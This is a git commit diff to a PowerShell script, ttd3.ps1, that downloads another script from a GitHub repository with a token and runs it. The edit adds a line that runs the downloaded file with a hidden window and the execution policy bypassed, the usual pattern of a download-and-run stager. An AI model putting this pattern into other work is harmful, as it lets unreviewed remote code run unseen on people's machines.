e84a7ce558f5c31010355ca70f0ec671625dd848
RichardHallade <131862158+RichardHallade@users.noreply.github.com>
2024-03-13 16:29:02 +0100

    Update ttd3.ps1

--- ttd3.ps1
+++ ttd3.ps1
@@ -1,5 +1,7 @@
 param ($token, $owner)
 $uri = "https://api.github.com/repos/$owner/crl/contents/scripts/ttd.ps1"
 $pl = iwr -Uri $uri -Headers @{"Authorization" = "Bearer $token";"Accept" = "application/vnd.github.v3.raw"} -OutFile "c:\temp\ttd.ps1"
-powershell.exe -w h -NoP -NonI -ep Bypass $pl
-powershell.exe -w h -NoP -NonI -ep Bypass "c:\temp\ttd.ps1"
+#powershell.exe -w h -NoP -NonI -ep Bypass $pl
+#powershell.exe -w h -NoP -NonI -ep Bypass "c:\temp\ttd.ps1"
+powershell $pl
+powershell -w h -NoP -NonI -ep Bypass "c:\temp\ttd.ps1"
